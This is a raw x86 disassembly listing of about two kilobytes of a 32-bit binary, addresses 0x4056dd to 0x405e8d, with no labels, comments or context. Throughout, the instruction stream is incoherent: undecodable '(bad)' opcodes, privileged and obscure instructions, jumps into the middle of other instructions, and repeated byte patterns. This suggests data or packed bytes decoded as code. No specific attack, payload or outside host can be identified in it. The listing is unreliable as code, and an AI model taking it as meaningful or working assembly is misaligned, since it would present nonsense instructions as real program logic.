  4056dd:	add    BYTE PTR ds:0x41107840,al
  4056e3:	bound  eax,QWORD PTR [eax+0x40]
  4056e6:	sldt   WORD PTR [eax-0x34]
  4056ea:	js     0x40574e
  4056ec:	add    eax,0x40664143
  4056f1:	inc    ebx
  4056f2:	add    BYTE PTR [ecx+0x5],al
  4056f5:	js     0x405737
  4056f7:	bound  eax,QWORD PTR [eax+0x0]
  4056fa:	inc    eax
  4056fb:	int    0xe9
  4056fd:	dec    esp
  4056fe:	stos   DWORD PTR es:[edi],eax
  4056ff:	inc    ebx
  405700:	pop    ds
  405701:	ins    BYTE PTR es:[edi],dx
  405702:	jns    0x405760
  405704:	ss adc eax,0xb53ff391
  40570a:	mov    ds:0xbfcbcb62,eax
  40570f:	cmp    cl,cl
  405711:	ins    DWORD PTR es:[edi],dx
  405712:	or     esp,DWORD PTR [edx+0x62481711]
  405718:	lods   al,BYTE PTR ds:[esi]
  405719:	sbb    edi,DWORD PTR [edi-0x6f]
  40571c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40571d:	xor    al,0x42
  40571f:	leave  
  405720:	fdivr  DWORD PTR [ebp+0xb]
  405723:	inc    ebp
  405724:	js     0x405772
  405726:	inc    esp
  405727:	inc    ecx
  405728:	jmp    0x405797
  40572a:	jg     0x405756
  40572c:	jnp    0x40573b
  40572e:	and    BYTE PTR [eax-0x5bbe282],al
  405734:	inc    ecx
  405735:	inc    ebx
  405736:	inc    eax
  405737:	inc    eax
  405738:	add    eax,0x434162
  40573d:	inc    eax
  40573e:	add    BYTE PTR [edx+0x5],ah
  405741:	inc    eax
  405742:	adc    BYTE PTR [edx+0x40],ah
  405745:	inc    ebx
  405746:	inc    ecx
  405747:	add    eax,0x4340
  40574c:	add    eax,0x404162
  405751:	add    BYTE PTR [eax+0x43],al
  405754:	inc    eax
  405755:	add    eax,0xc3f17b62
  40575a:	push   esi
  40575b:	loope  0x4056fc
  40575d:	mov    bh,0x18
  40575f:	mov    eax,0x6ed7bca8
  405764:	or     eax,0x470d10d5
  405769:	add    eax,0x4063d6
  40576e:	add    BYTE PTR [ecx+0x43],al
  405771:	add    eax,0x41784062
  405776:	inc    eax
  405777:	inc    eax
  405778:	add    BYTE PTR [edi],cl
  40577a:	bound  eax,QWORD PTR [ebx+0x0]
  40577d:	add    eax,0x25006240
  405782:	inc    eax
  405783:	add    eax,0x40254143
  405788:	add    eax,0x36620000
  40578d:	bound  esp,QWORD PTR [ecx]
  40578f:	retf   
  405790:	ds retf 
  405792:	sbb    eax,0x5ab87a62
  405797:	pop    ds
  405798:	popa   
  405799:	dec    ecx
  40579a:	jecxz  0x4057bf
  40579c:	push   cs
  40579d:	test   DWORD PTR [edx+ecx*2],edi
  4057a0:	aam    0xab
  4057a2:	xchg   ebp,eax
  4057a3:	shl    DWORD PTR [ecx+edi*2-0x58],cl
  4057a7:	pop    esp
  4057a8:	fild   DWORD PTR [esi+0x4e]
  4057ab:	in     eax,0x14
  4057ad:	push   edx
  4057ae:	mov    edi,0xc76f28c0
  4057b3:	aas    
  4057b4:	and    eax,0x43d6
  4057b9:	add    BYTE PTR [ecx+0x40],al
  4057bc:	bound  esp,QWORD PTR [esi+0x0]
  4057bf:	inc    eax
  4057c0:	add    eax,0x5400000
  4057c5:	inc    ecx
  4057c6:	inc    eax
  4057c7:	inc    eax
  4057c8:	bound  esp,QWORD PTR ds:0x25050043
  4057ce:	inc    ecx
  4057cf:	inc    ebx
  4057d0:	inc    eax
  4057d1:	test   BYTE PTR [eax+0x0],al
  4057d4:	bound  ebx,QWORD PTR [eax+0x62]
  4057d7:	inc    ecx
  4057d8:	inc    eax
  4057d9:	sub    dl,BYTE PTR [ebp+0x7a7b8462]
  4057df:	jno    0x4057a9
  4057e1:	inc    eax
  4057e2:	pop    esp
  4057e3:	xchg   edx,eax
  4057e4:	jnp    0x40582d
  4057e6:	jecxz  0x40579d
  4057e8:	ret    
  4057e9:	sub    ah,BYTE PTR [ecx]
  4057eb:	lds    ecx,FWORD PTR [ebx]
  4057ed:	outs   dx,BYTE PTR ds:[esi]
  4057ee:	fild   DWORD PTR [ecx+0x3e]
  4057f1:	mov    edi,0x7bcdbf6b
  4057f6:	in     al,0x71
  4057f8:	cmp    eax,0x41406210
  4057fd:	and    eax,0x40000500
  405802:	inc    ebx
  405803:	add    eax,0x40624041
  405808:	inc    ebx
  405809:	add    eax,0x43402541
  40580e:	bound  eax,QWORD PTR [eax+0x43]
  405811:	int3   
  405812:	inc    eax
  405813:	bound  eax,QWORD PTR [eax]
  405815:	inc    ecx
  405816:	inc    eax
  405817:	inc    eax
  405818:	add    eax,0x1550bf05
  40581d:	add    DWORD PTR [edx+0x9634b27],ebp
  405823:	imul   BYTE PTR gs:[edx+esi*1+0x54]
  405828:	push   eax
  405829:	inc    esi
  40582a:	aad    0x5c
  40582c:	dec    edi
  40582d:	(bad)  [ebx-0x57d7f11f]
  405833:	and    BYTE PTR [edi+0x79],cl
  405836:	jb     0x405867
  405838:	jg     0x4057fb
  40583a:	inc    eax
  40583b:	mov    edx,0x254062
  405840:	inc    ax
  405842:	add    eax,0x40404143
  405847:	inc    ebx
  405848:	add    BYTE PTR [eax],al
  40584a:	add    BYTE PTR [edx-0x34],ah
  40584d:	inc    eax
  40584e:	add    eax,0x40004041
  405853:	inc    ecx
  405854:	int3   
  405855:	add    BYTE PTR [ebx-0x7c],al
  405858:	add    eax,0x5406240
  40585d:	bound  eax,QWORD PTR [esp+edi*2+0x6]
  405861:	gs jno 0x40588e
  405864:	inc    eax
  405865:	ret    
  405866:	inc    ebx
  405867:	bound  ebp,QWORD PTR [eax+0x66a80c71]
  40586d:	pop    ss
  40586e:	les    ebp,FWORD PTR [ebp+0x5a]
  405871:	and    eax,0x4a2a12d1
  405876:	and    al,0x88
  405878:	test   eax,0x40445c44
  40587d:	bound  ebx,QWORD PTR [eax+0x41]
  405880:	add    eax,0x40404340
  405885:	inc    ebx
  405886:	inc    eax
  405887:	test   BYTE PTR [eax],al
  405889:	add    eax,0x40624041
  40588e:	inc    eax
  40588f:	add    BYTE PTR [edx+0x5],ah
  405892:	inc    ebx
  405893:	add    BYTE PTR [eax+0x78],al
  405896:	inc    ecx
  405897:	add    BYTE PTR [eax+0x41],bl
  40589a:	bound  ebp,QWORD PTR [eax-0x179cf79c]
  4058a0:	loopne 0x4058d2
  4058a2:	inc    ecx
  4058a3:	pop    eax
  4058a4:	xor    al,BYTE PTR [ebx+0x42]
  4058a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058a8:	scas   al,BYTE PTR es:[edi]
  4058a9:	adc    al,0x14
  4058ab:	dec    edi
  4058ac:	lock xor ch,al
  4058af:	cmp    ebx,DWORD PTR [esi-0x33ff7bc0]
  4058b5:	bound  eax,QWORD PTR ds:0xcc840f41
  4058bb:	inc    ebx
  4058bc:	add    BYTE PTR [eax+0x0],al
  4058bf:	inc    eax
  4058c0:	inc    eax
  4058c1:	inc    eax
  4058c2:	int3   
  4058c3:	add    BYTE PTR ds:0x62404341,al
  4058c9:	pop    eax
  4058ca:	add    BYTE PTR [ebx+0x40],al
  4058cd:	bound  ecx,QWORD PTR [edi]
  4058cf:	inc    eax
  4058d0:	dec    esp
  4058d1:	retf   
  4058d2:	jmp    0x405937
  4058d4:	xchg   edx,eax
  4058d5:	jl     0x40585c
  4058d7:	add    eax,0x43acb472
  4058dc:	jae    0x40592e
  4058de:	pop    esi
  4058df:	loope  0x40587e
  4058e1:	or     eax,0xa8d93c62
  4058e6:	sbb    dl,BYTE PTR [ebx+0x7e84cb10]
  4058ec:	inc    ecx
  4058ed:	adc    cl,BYTE PTR [ebx-0x3cbfdc55]
  4058f3:	inc    esp
  4058f4:	inc    ebp
  4058f5:	pop    ecx
  4058f6:	bound  edx,QWORD PTR [ebx+0x30]
  4058f9:	mov    al,ds:0x2701f535
  4058fe:	pop    es
  4058ff:	add    BYTE PTR [eax],al
  405901:	inc    eax
  405902:	inc    eax
  405903:	cmovno eax,DWORD PTR ds:0x40056243
  40590a:	int3   
  40590b:	add    ah,cl
  40590d:	inc    eax
  40590e:	inc    eax
  40590f:	bound  eax,QWORD PTR [ecx+0x0]
  405912:	add    BYTE PTR [edi],cl
  405914:	inc    ebx
  405915:	inc    eax
  405916:	inc    eax
  405917:	add    BYTE PTR [ecx+0x43],al
  40591a:	add    eax,0x40256240
  40591f:	bound  eax,QWORD PTR [eax]
  405921:	popa   
  405922:	or     DWORD PTR [ecx+0x425201a6],eax
  405928:	jg     0x40598a
  40592a:	adc    ecx,DWORD PTR [ebx+0x62]
  40592d:	arpl   WORD PTR [edi+0x5a59e2e8],di
  405933:	xchg   esp,eax
  405934:	test   al,0x10
  405936:	adc    eax,0x41fad167
  40593b:	adc    al,0x10
  40593d:	jne    0x40590c
  40593f:	nop
  405940:	push   0x24
  405942:	jg     0x4059a6
  405944:	sub    DWORD PTR [ecx],edx
  405946:	imul   edx,DWORD PTR [ebp-0x5e],0xf6f8053a
  40594d:	bound  esi,QWORD PTR ds:0x5f4106c9
  405953:	add    eax,0x4140cc00
  405958:	inc    eax
  405959:	inc    ebx
  40595a:	bound  esp,QWORD PTR ds:0x41400043
  405960:	add    BYTE PTR [eax],al
  405962:	add    eax,0x43624062
  405967:	inc    ecx
  405968:	inc    eax
  405969:	inc    eax
  40596a:	inc    eax
  40596b:	add    eax,0x40624340
  405970:	add    eax,0x40664140
  405975:	adc    bl,BYTE PTR [edi+0x38]
  405978:	inc    edx
  405979:	jnp    0x4059b5
  40597b:	mov    eax,ds:0x88a84c05
  405980:	outs   dx,BYTE PTR ds:[esi]
  405981:	hlt    
  405982:	mov    eax,ds:0x12825fa5
  405987:	bound  ecx,QWORD PTR [eax-0x39abbe9e]
  40598d:	ret    
  40598e:	pop    esp
  40598f:	dec    esp
  405990:	bound  ebx,QWORD PTR [edx+esi*4+0x11b8df23]
  405997:	sbb    al,0x24
  405999:	mov    ebp,DWORD PTR [eax]
  40599b:	imul   ebx,DWORD PTR [edi],0x64b5cb43
  4059a1:	test   al,0x96
  4059a3:	jecxz  0x4059e8
  4059a5:	add    BYTE PTR ds:0x41107840,al
  4059ab:	bound  eax,QWORD PTR [eax+0x40]
  4059ae:	sldt   WORD PTR [eax-0x34]
  4059b2:	js     0x405a16
  4059b4:	add    eax,0x40664143
  4059b9:	inc    ebx
  4059ba:	add    BYTE PTR [ecx+0x5],al
  4059bd:	js     0x4059ff
  4059bf:	bound  eax,QWORD PTR [eax+0x0]
  4059c2:	inc    eax
  4059c3:	and    eax,0x6263ac4c
  4059c8:	adc    dh,BYTE PTR [ecx]
  4059ca:	dec    esp
  4059cb:	dec    esi
  4059cc:	xor    BYTE PTR ds:0x77bf6af7,cl
  4059d2:	mov    ds:0x43cb5251,al
  4059d7:	mov    al,ds:0xe3a86b4a
  4059dc:	adc    DWORD PTR [ebp+edi*1+0x433f1462],edx
  4059e3:	sbb    eax,ebx
  4059e5:	stos   DWORD PTR es:[edi],eax
  4059e6:	jbe    0x4059c5
  4059e8:	int    0x5a
  4059ea:	pusha  
  4059eb:	inc    eax
  4059ec:	dec    BYTE PTR [eax+0xd]
  4059ef:	scas   eax,DWORD PTR es:[edi]
  4059f0:	dec    eax
  4059f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059f2:	and    esi,DWORD PTR [ecx]
  4059f4:	adc    al,0x4f
  4059f6:	fadd   QWORD PTR [ecx+0x43]
  4059f9:	inc    eax
  4059fa:	inc    eax
  4059fb:	add    eax,0x434162
  405a00:	inc    eax
  405a01:	add    BYTE PTR [edx+0x5],ah
  405a04:	inc    eax
  405a05:	adc    BYTE PTR [edx+0x40],ah
  405a08:	inc    ebx
  405a09:	inc    ecx
  405a0a:	add    eax,0x4340
  405a0f:	add    eax,0x404162
  405a14:	add    BYTE PTR [eax+0x43],al
  405a17:	inc    eax
  405a18:	add    eax,0x6592cba8
  405a1d:	enter  0xcc54,0x6a
  405a21:	mov    esi,0x17a30048
  405a26:	sar    DWORD PTR [esi],1
  405a28:	les    ebp,FWORD PTR [edx]
  405a2a:	dec    eax
  405a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a2c:	add    dh,BYTE PTR [edx]
  405a2e:	cmp    BYTE PTR [eax+0x5b5e4230],dh
  405a34:	stos   BYTE PTR es:[edi],al
  405a35:	mov    edi,0xd0e8a865
  405a3a:	and    BYTE PTR [ebp+0x404e6dab],0x6d
  405a41:	test   BYTE PTR [eax],dl
  405a43:	icebp  
  405a44:	and    edi,ebp
  405a46:	int3   
  405a47:	inc    eax
  405a48:	mov    edi,0x41000040
  405a4d:	inc    ebx
  405a4e:	add    eax,0x41784062
  405a53:	inc    eax
  405a54:	inc    eax
  405a55:	add    BYTE PTR [edi],cl
  405a57:	bound  eax,QWORD PTR [ebx+0x0]
  405a5a:	add    eax,0x25006240
  405a5f:	inc    eax
  405a60:	add    eax,0x40254143
  405a65:	add    eax,0x62620000
  405a6a:	mov    al,0x53
  405a6c:	inc    ebp
  405a6d:	xor    esp,DWORD PTR [ebp+0x53]
  405a70:	hlt    
  405a71:	sbb    eax,DWORD PTR ds:0xcd9160e3
  405a77:	enter  0xc65,0xcd
  405a7b:	sbb    eax,0x28a83f32
  405a80:	xor    DWORD PTR [edx+0x12],esp
  405a83:	xchg   BYTE PTR [eax+0x46],cl
  405a86:	js     0x405ad7
  405a88:	aam    0x41
  405a8a:	push   eax
  405a8b:	inc    ebp
  405a8c:	mov    eax,ds:0x65352ad2
  405a91:	mov    al,ds:0x74054a15
  405a96:	inc    ebx
  405a97:	add    BYTE PTR [eax],al
  405a99:	add    BYTE PTR [ecx+0x40],al
  405a9c:	bound  esp,QWORD PTR [esi+0x0]
  405a9f:	inc    eax
  405aa0:	add    eax,0x5400000
  405aa5:	inc    ecx
  405aa6:	inc    eax
  405aa7:	inc    eax
  405aa8:	bound  esp,QWORD PTR ds:0x25050043
  405aae:	inc    ecx
  405aaf:	inc    ebx
  405ab0:	inc    eax
  405ab1:	test   BYTE PTR [eax+0x0],al
  405ab4:	bound  ebx,QWORD PTR [eax+0x62]
  405ab7:	inc    ecx
  405ab8:	inc    eax
  405ab9:	inc    edx
  405aba:	inc    eax
  405abb:	xlat   BYTE PTR ds:[ebx]
  405abc:	add    eax,0x40e15dcb
  405ac1:	mov    cs,WORD PTR [eax-0x44]
  405ac4:	xchg   BYTE PTR [ebp-0x53],al
  405ac7:	push   eax
  405ac8:	push   ecx
  405ac9:	xor    BYTE PTR [edx+0xb564162],dh
  405acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ad0:	inc    esi
  405ad1:	(bad)
  405ad4:	outs   dx,DWORD PTR ds:[esi]
  405ad5:	mov    esp,0x4fdf0859
  405ada:	dec    esp
  405adb:	or     eax,0xe1df244c
  405ae0:	jg     0x405b27
  405ae2:	inc    ebp
  405ae3:	inc    ebx
  405ae4:	bound  eax,QWORD PTR [edx-0x7a]
  405ae7:	popa   
  405ae8:	icebp  
  405ae9:	lods   al,BYTE PTR ds:[esi]
  405aea:	xor    eax,0x62109cb4
  405aef:	inc    eax
  405af0:	inc    ecx
  405af1:	and    eax,0x40000500
  405af6:	inc    ebx
  405af7:	add    eax,0x40624041
  405afc:	inc    ebx
  405afd:	add    eax,0x43402541
  405b02:	bound  eax,QWORD PTR [eax+0x43]
  405b05:	int3   
  405b06:	inc    eax
  405b07:	bound  eax,QWORD PTR [eax]
  405b09:	inc    ecx
  405b0a:	inc    eax
  405b0b:	inc    eax
  405b0c:	add    eax,0xe2ff9d05
  405b11:	or     edi,DWORD PTR ds:0x69eb417e
  405b17:	or     ebx,DWORD PTR [edi]
  405b19:	mov    bl,0xc3
  405b1b:	(bad)  
  405b1c:	push   edi
  405b1d:	lds    ebx,FWORD PTR [edx]
  405b1f:	add    BYTE PTR ds:0x30474300,ah
  405b25:	dec    esp
  405b26:	push   esi
  405b27:	rcl    DWORD PTR [ecx+0x7f],1
  405b2a:	mov    edx,ecx
  405b2c:	addr16 cwde 
  405b2e:	cmp    eax,0x9061232b
  405b33:	lahf   
  405b34:	sbb    BYTE PTR ds:0xd152464b,al
  405b3a:	bound  ebp,QWORD PTR [eax]
  405b3c:	popa   
  405b3d:	xchg   DWORD PTR [eax],esp
  405b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b40:	es inc esp
  405b43:	or     ah,BYTE PTR [edx+0x40]
  405b46:	and    eax,0x5406600
  405b4b:	inc    ebx
  405b4c:	inc    ecx
  405b4d:	inc    eax
  405b4e:	inc    eax
  405b4f:	inc    ebx
  405b50:	add    BYTE PTR [eax],al
  405b52:	add    BYTE PTR [edx-0x34],ah
  405b55:	inc    eax
  405b56:	add    eax,0x40004041
  405b5b:	inc    ecx
  405b5c:	int3   
  405b5d:	add    BYTE PTR [ebx-0x7c],al
  405b60:	add    eax,0x5406240
  405b65:	bound  ebp,QWORD PTR [eax+0x108a6941]
  405b6b:	pop    eax
  405b6c:	dec    edi
  405b6d:	ins    BYTE PTR es:[edi],dx
  405b6e:	adc    bl,BYTE PTR ds:0xb118aad2
  405b74:	inc    eax
  405b75:	addr16 mov ah,0xf8
  405b78:	(bad)  
  405b79:	in     al,0xeb
  405b7b:	dec    eax
  405b7c:	mov    ah,0x15
  405b7e:	inc    edx
  405b7f:	bound  esi,QWORD PTR [esi-0x1f]
  405b82:	push   edi
  405b83:	xchg   ecx,eax
  405b84:	inc    ecx
  405b85:	aam    0x1
  405b87:	inc    edx
  405b88:	fs inc esi
  405b8a:	popa   
  405b8b:	dec    ebx
  405b8c:	jmp    0x4374a863
  405b91:	stc    
  405b92:	out    dx,al
  405b93:	mov    bl,0x88
  405b95:	lds    eax,FWORD PTR [eax+0x62]
  405b98:	pop    eax
  405b99:	inc    ecx
  405b9a:	add    eax,0x40404340
  405b9f:	inc    ebx
  405ba0:	inc    eax
  405ba1:	test   BYTE PTR [eax],al
  405ba3:	add    eax,0x40624041
  405ba8:	inc    eax
  405ba9:	add    BYTE PTR [edx+0x5],ah
  405bac:	inc    ebx
  405bad:	add    BYTE PTR [eax+0x78],al
  405bb0:	inc    ecx
  405bb1:	add    BYTE PTR [eax+0x41],bl
  405bb4:	bound  edx,QWORD PTR [ebx+0x55]
  405bb7:	push   ecx
  405bb8:	lahf   
  405bb9:	gs ins BYTE PTR es:[edi],dx
  405bbb:	arpl   WORD PTR [edi+0x43],cx
  405bbe:	test   al,0x4
  405bc0:	das    
  405bc1:	push   edx
  405bc2:	jg     0x405b82
  405bc4:	inc    eax
  405bc5:	call   DWORD PTR [eax]
  405bc7:	int    0xd8
  405bc9:	and    DWORD PTR [eax+eiz*8-0x70],eax
  405bcd:	mov    ecx,0x2f77b898
  405bd2:	adc    edx,DWORD PTR ds:0x1505653d
  405bd8:	dec    eax
  405bd9:	inc    ebx
  405bda:	daa    
  405bdb:	arpl   bx,ax
  405bdd:	jno    0x405bac
  405bdf:	retf   
  405be0:	jl     0x405c44
  405be2:	jb     0x405c2f
  405be4:	dec    edx
  405be5:	xor    al,0x43
  405be7:	dec    eax
  405be8:	(bad)  
  405beb:	and    al,0x45
  405bed:	sar    DWORD PTR [ecx+0x40],cl
  405bf0:	test   BYTE PTR [eax],al
  405bf2:	int3   
  405bf3:	bound  eax,QWORD PTR ds:0xcc840f41
  405bf9:	inc    ebx
  405bfa:	add    BYTE PTR [eax+0x0],al
  405bfd:	inc    eax
  405bfe:	inc    eax
  405bff:	inc    eax
  405c00:	int3   
  405c01:	add    BYTE PTR ds:0x62404341,al
  405c07:	pop    eax
  405c08:	add    BYTE PTR [ebx+0x40],al
  405c0b:	bound  ecx,QWORD PTR [edi]
  405c0d:	inc    eax
  405c0e:	retf   
  405c0f:	movntps XMMWORD PTR [ebx-0x41],xmm7
  405c13:	push   cs
  405c14:	sahf   
  405c15:	pop    esp
  405c16:	dec    esp
  405c17:	xchg   ebx,eax
  405c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c19:	adc    BYTE PTR [ebx-0x1c],dh
  405c1c:	arpl   WORD PTR [edx+0x47],dx
  405c1f:	aaa    
  405c20:	push   esi
  405c21:	mov    ebp,0x35d863a8
  405c26:	pop    eax
  405c27:	cld    
  405c28:	loope  0x405c8a
  405c2a:	adc    BYTE PTR [eax-0xf27a91a],dl
  405c30:	add    ah,BYTE PTR es:[ebp+eax*1+0x11]
  405c35:	shr    DWORD PTR [eax-0xb],1
  405c38:	and    eax,DWORD PTR [eax]
  405c3a:	add    BYTE PTR [eax+0x40],al
  405c3d:	cmovno eax,DWORD PTR ds:0x40056243
  405c44:	int3   
  405c45:	add    ah,cl
  405c47:	inc    eax
  405c48:	inc    eax
  405c49:	bound  eax,QWORD PTR [ecx+0x0]
  405c4c:	add    BYTE PTR [edi],cl
  405c4e:	inc    ebx
  405c4f:	inc    eax
  405c50:	inc    eax
  405c51:	add    BYTE PTR [ecx+0x43],al
  405c54:	add    eax,0x40256240
  405c59:	bound  eax,QWORD PTR [eax]
  405c5b:	xor    DWORD PTR [edx],eax
  405c5d:	leave  
  405c5e:	sub    BYTE PTR [eax+edi*4],0x70
  405c62:	inc    edx
  405c63:	inc    eax
  405c64:	retf   
  405c65:	inc    esp
  405c66:	cs push esi
  405c68:	cmc    
  405c69:	pop    esp
  405c6a:	and    DWORD PTR [ecx+0x44],edx
  405c6d:	inc    ecx
  405c6e:	arpl   cx,dx
  405c70:	fimul  DWORD PTR [edi+0x41cf4bc2]
  405c76:	mov    al,0x6b
  405c78:	rol    DWORD PTR ds:0x4140cc00,0x40
  405c7f:	inc    ebx
  405c80:	bound  esp,QWORD PTR ds:0x41400043
  405c86:	add    BYTE PTR [eax],al
  405c88:	add    eax,0x43624062
  405c8d:	inc    ecx
  405c8e:	inc    eax
  405c8f:	inc    eax
  405c90:	inc    eax
  405c91:	add    eax,0x40624340
  405c96:	add    eax,0x40664140
  405c9b:	cmp    ah,BYTE PTR [ecx]
  405c9d:	aas    
  405c9e:	and    al,0x30
  405ca0:	mov    BYTE PTR [eax+0x588c42],ch
  405ca6:	bound  ebx,QWORD PTR [ecx+0x41]
  405ca9:	jecxz  0x405c68
  405cab:	cmp    cl,ah
  405cad:	icebp  
  405cae:	push   0x7b326264
  405cb3:	inc    edx
  405cb4:	inc    DWORD PTR [ebp+0x8]
  405cb7:	test   al,0x6b
  405cb9:	cwde   
  405cba:	jne    0x405d30
  405cbc:	push   edx
  405cbd:	xlat   BYTE PTR ds:[ebx]
  405cbe:	popf   
  405cbf:	inc    eax
  405cc0:	dec    esp
  405cc1:	cld    
  405cc2:	dec    esp
  405cc3:	mov    esp,DWORD PTR [ebx+0xd2a4a6f]
  405cc9:	bound  ebp,QWORD PTR [edi-0x5b]
  405ccc:	push   es
  405ccd:	mov    cl,0x43
  405ccf:	add    BYTE PTR ds:0x41107840,al
  405cd5:	bound  eax,QWORD PTR [eax+0x40]
  405cd8:	sldt   WORD PTR [eax-0x34]
  405cdc:	js     0x405d40
  405cde:	add    eax,0x40664143
  405ce3:	inc    ebx
  405ce4:	add    BYTE PTR [ecx+0x5],al
  405ce7:	js     0x405d29
  405ce9:	bound  eax,QWORD PTR [eax+0x0]
  405cec:	inc    eax
  405ced:	bound  ebp,QWORD PTR [eax+0x3d7828cb]
  405cf3:	and    DWORD PTR [ebp-0xf],eax
  405cf6:	add    eax,0x7ee4100f
  405cfb:	dec    ecx
  405cfc:	xor    DWORD PTR [ecx+ecx*8],edi
  405cff:	xor    al,0x80
  405d01:	bound  esi,QWORD PTR [esi-0x1d]
  405d04:	aas    
  405d05:	bound  eax,QWORD PTR [ebp+0x4c]
  405d08:	add    eax,0x4442c44c
  405d0d:	inc    edi
  405d0e:	mov    es,WORD PTR [ebp+ecx*8+0xd]
  405d12:	out    dx,eax
  405d13:	jecxz  0x405d06
  405d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d16:	push   0xfd551239
  405d1b:	adc    edi,ecx
  405d1d:	inc    ecx
  405d1e:	inc    ebx
  405d1f:	inc    eax
  405d20:	inc    eax
  405d21:	add    eax,0x434162
  405d26:	inc    eax
  405d27:	add    BYTE PTR [edx+0x5],ah
  405d2a:	inc    eax
  405d2b:	adc    BYTE PTR [edx+0x40],ah
  405d2e:	inc    ebx
  405d2f:	inc    ecx
  405d30:	add    eax,0x4340
  405d35:	add    eax,0x404162
  405d3a:	add    BYTE PTR [eax+0x43],al
  405d3d:	inc    eax
  405d3e:	add    eax,0x43fc6369
  405d43:	(bad)  
  405d44:	stos   DWORD PTR es:[edi],eax
  405d45:	mov    ds:0x536397f3,eax
  405d4a:	shr    BYTE PTR [edi],0xb3
  405d4d:	xor    BYTE PTR [ecx-0x38],ch
  405d50:	popa   
  405d51:	pop    ss
  405d52:	dec    eax
  405d53:	sti    
  405d54:	call   0x8d57b27a
  405d59:	cli    
  405d5a:	bound  ebp,QWORD PTR [eax-0x37dc8233]
  405d60:	stos   BYTE PTR es:[edi],al
  405d61:	add    eax,0x693d1041
  405d66:	adc    esi,DWORD PTR [edx+0x62]
  405d69:	arpl   WORD PTR [eax+0x0],ax
  405d6c:	add    BYTE PTR [ecx+0x43],al
  405d6f:	add    eax,0x41784062
  405d74:	inc    eax
  405d75:	inc    eax
  405d76:	add    BYTE PTR [edi],cl
  405d78:	bound  eax,QWORD PTR [ebx+0x0]
  405d7b:	add    eax,0x25006240
  405d80:	inc    eax
  405d81:	add    eax,0x40254143
  405d86:	add    eax,0xd4620000
  405d8b:	inc    edx
  405d8c:	inc    ebx
  405d8d:	inc    eax
  405d8e:	rol    ah,0xcd
  405d91:	xchg   esi,eax
  405d92:	int    0xcb
  405d94:	ja     0x405d39
  405d96:	push   ecx
  405d97:	dec    edi
  405d98:	adc    ch,BYTE PTR [ebx-0x401eb74c]
  405d9e:	pop    esp
  405d9f:	inc    eax
  405da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405da1:	inc    edx
  405da2:	inc    ecx
  405da3:	adc    eax,0x68775264
  405da8:	adc    eax,0x43cbecab
  405dad:	add    BYTE PTR [eax],al
  405daf:	add    BYTE PTR [ecx+0x40],al
  405db2:	bound  esp,QWORD PTR [esi+0x0]
  405db5:	inc    eax
  405db6:	add    eax,0x5400000
  405dbb:	inc    ecx
  405dbc:	inc    eax
  405dbd:	inc    eax
  405dbe:	bound  esp,QWORD PTR ds:0x25050043
  405dc4:	inc    ecx
  405dc5:	inc    ebx
  405dc6:	inc    eax
  405dc7:	test   BYTE PTR [eax+0x0],al
  405dca:	bound  ebx,QWORD PTR [eax+0x62]
  405dcd:	inc    ecx
  405dce:	inc    eax
  405dcf:	mov    ch,0xe5
  405dd1:	dec    ecx
  405dd2:	cmp    BYTE PTR [ecx-0x48],al
  405dd5:	clc    
  405dd6:	pop    edx
  405dd7:	pop    ecx
  405dd8:	icebp  
  405dd9:	sbb    eax,ebx
  405ddb:	jnp    0x405e1f
  405ddd:	push   edx
  405dde:	inc    edi
  405ddf:	add    DWORD PTR [ecx+0x7b64bccf],ebp
  405de5:	sub    ebx,DWORD PTR [edx-0x19]
  405de8:	fidivr WORD PTR [ecx]
  405dea:	add    eax,0x2c7bdc66
  405def:	cmp    ch,BYTE PTR [ecx-0x41]
  405df2:	inc    esi
  405df3:	inc    eax
  405df4:	arpl   WORD PTR [eax],dx
  405df6:	bound  eax,QWORD PTR [eax+0x41]
  405df9:	and    eax,0x40000500
  405dfe:	inc    ebx
  405dff:	add    eax,0x40624041
  405e04:	inc    ebx
  405e05:	add    eax,0x43402541
  405e0a:	bound  eax,QWORD PTR [eax+0x43]
  405e0d:	int3   
  405e0e:	inc    eax
  405e0f:	bound  eax,QWORD PTR [eax]
  405e11:	inc    ecx
  405e12:	inc    eax
  405e13:	inc    eax
  405e14:	add    eax,0xde4c6905
  405e19:	mov    fs,WORD PTR [ebx]
  405e1b:	inc    ecx
  405e1c:	outs   dx,DWORD PTR ds:[esi]
  405e1d:	arpl   WORD PTR [edx-0x7c],sp
  405e20:	mov    al,0x61
  405e22:	push   ecx
  405e23:	xor    BYTE PTR [ebp-0x4f3c05bc],bl
  405e29:	push   cs
  405e2a:	pop    edi
  405e2b:	jg     0x405e8f
  405e2d:	push   edx
  405e2e:	ret    
  405e2f:	xchg   ecx,eax
  405e30:	push   edi
  405e31:	mov    eax,ds:0x35b1c4f1
  405e36:	bound  eax,QWORD PTR [eax+0x25]
  405e39:	add    BYTE PTR [esi+0x40],ah
  405e3c:	add    eax,0x40404143
  405e41:	inc    ebx
  405e42:	add    BYTE PTR [eax],al
  405e44:	add    BYTE PTR [edx-0x34],ah
  405e47:	inc    eax
  405e48:	add    eax,0x40004041
  405e4d:	inc    ecx
  405e4e:	int3   
  405e4f:	add    BYTE PTR [ebx-0x7c],al
  405e52:	add    eax,0x5406240
  405e57:	(bad)  
  405e58:	leave  
  405e59:	inc    ecx
  405e5a:	stos   DWORD PTR es:[edi],eax
  405e5b:	and    DWORD PTR gs:[edi+0x24],ecx
  405e5f:	sbb    al,0x63
  405e61:	pop    edx
  405e62:	stos   BYTE PTR es:[edi],al
  405e63:	arpl   WORD PTR [ebx+0x5b94340],si
  405e69:	int3   
  405e6a:	lea    eax,[ebx-0x40]
  405e6d:	mov    fs:0xfe6d87c3,al
  405e73:	mov    ds:0x41c43af1,eax
  405e78:	inc    eax
  405e79:	pop    esp
  405e7a:	jge    0x405ebc
  405e7c:	bound  ebx,QWORD PTR [eax+0x41]
  405e7f:	add    eax,0x40404340
  405e84:	inc    ebx
  405e85:	inc    eax
  405e86:	test   BYTE PTR [eax],al
  405e88:	add    eax,0x40624041
  405e8d:	inc    eax
